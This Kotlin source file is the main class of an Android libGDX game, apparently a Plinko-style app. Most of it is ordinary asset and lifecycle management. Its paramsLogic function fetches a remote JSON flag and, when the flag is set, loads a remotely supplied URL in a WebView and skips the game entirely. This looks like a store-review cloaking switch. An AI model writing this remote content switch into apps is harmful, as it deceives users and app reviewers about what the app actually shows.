package com.plinki.kollinllabs.game

import android.content.Context.MODE_PRIVATE
import android.content.SharedPreferences
import com.badlogic.gdx.assets.AssetManager
import com.badlogic.gdx.utils.Disposable
import com.badlogic.gdx.utils.ScreenUtils
import com.plinki.kollinllabs.MainActivity
import com.plinki.kollinllabs.appContext
import com.plinki.kollinllabs.game.dataStore.DS_Balance
import com.plinki.kollinllabs.game.manager.MusicManager
import com.plinki.kollinllabs.game.manager.NavigationManager
import com.plinki.kollinllabs.game.manager.SoundManager
import com.plinki.kollinllabs.game.manager.SpriteManager
import com.plinki.kollinllabs.game.manager.util.MusicUtil
import com.plinki.kollinllabs.game.manager.util.SoundUtil
import com.plinki.kollinllabs.game.manager.util.SpriteUtil
import com.plinki.kollinllabs.game.screens.LoaderScreen
import com.plinki.kollinllabs.game.utils.GameColor
import com.plinki.kollinllabs.game.utils.advanced.AdvancedGame
import com.plinki.kollinllabs.game.utils.disposeAll
import com.plinki.kollinllabs.util.Gist
import com.plinki.kollinllabs.util.log
import kotlinx.coroutines.*

var GDX_GLOBAL_isGame = false
    private set

var GDX_GLOBAL_isPauseGame = false

var GDX_GLOBAL_isLoadAssets = false

var GDX_ORIGINAL_LINK = ""
    private set

class GDXGame(val activity: MainActivity) : AdvancedGame() {

    lateinit var assetManager     : AssetManager      private set
    lateinit var navigationManager: NavigationManager private set
    lateinit var spriteManager    : SpriteManager     private set
    lateinit var musicManager     : MusicManager      private set
    lateinit var soundManager     : SoundManager      private set

    val assetsLoader by lazy { SpriteUtil.Loader() }
    val assetsAll    by lazy { SpriteUtil.All() }

    val musicUtil by lazy { MusicUtil() }
    val soundUtil by lazy { SoundUtil() }

    var backgroundColor = GameColor.background
    val disposableSet   = mutableSetOf<Disposable>()

    val coroutine = CoroutineScope(Dispatchers.Default)

    val sharedPreferences: SharedPreferences = appContext.getSharedPreferences("Pinkake", MODE_PRIVATE)

    val ds_Balance = DS_Balance(coroutine)

    override fun create() {
        navigationManager = NavigationManager()
        assetManager      = AssetManager()
        spriteManager     = SpriteManager(assetManager)

        musicManager      = MusicManager(assetManager)
        soundManager      = SoundManager(assetManager)

        navigationManager.navigate(LoaderScreen::class.java.name)

        paramsLogic()
    }

    override fun render() {
        if (GDX_GLOBAL_isPauseGame) return

        ScreenUtils.clear(backgroundColor)
        super.render()
    }

    override fun dispose() {
        try {
            log("dispose LibGDXGame")
            coroutine.cancel()
            disposableSet.disposeAll()
            disposeAll(assetManager, musicUtil)
            super.dispose()
        } catch (e: Exception) { log("exception: ${e.message}") }
    }

    override fun pause() {
        super.pause()
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.pause()
    }

    override fun resume() {
        super.resume()
        if (GDX_GLOBAL_isLoadAssets) musicUtil.currentMusic?.play()
    }

    // Logic Web ---------------------------------------------------------------------------

    private fun paramsLogic() {
        log("paramsLogic")
        activity.webViewHelper.blockRedirect = { GDX_GLOBAL_isGame = true }
        activity.webViewHelper.initWeb()

        //GDX_GLOBAL_isGame = true
        //return

        val path = sharedPreferences.getString("Brawo", "we") ?: "we"

        try {
            if (path == "we") {
                coroutine.launch(Dispatchers.Main) {
                    val getJSON = withContext(Dispatchers.IO) { Gist.getDataJson() }

                    log("json: $getJSON")

                    if (getJSON != null) {
                        if (getJSON.flag == "true") {
                            GDX_ORIGINAL_LINK = getJSON.link
                            activity.webViewHelper.loadUrl(GDX_ORIGINAL_LINK)

                            //GDX_ORIGINAL_LINK = "https://www.google.test"
                            //activity.webViewHelper.loadUrl("https://www.google.com/")
                        } else {
                            GDX_GLOBAL_isGame = true
                        }

                        //coroutine.launch(Dispatchers.IO) { sharedPreferences.edit().putString("True", link).apply() }
                        //activity.loadUrl(link)

                    } else {
                        GDX_GLOBAL_isGame = true
                    }
                }
            } else {
                activity.webViewHelper.loadUrl(path)
            }
        } catch (e: Exception) {
            log("error: ${e.message}")
            GDX_GLOBAL_isGame = true
        }

    }

}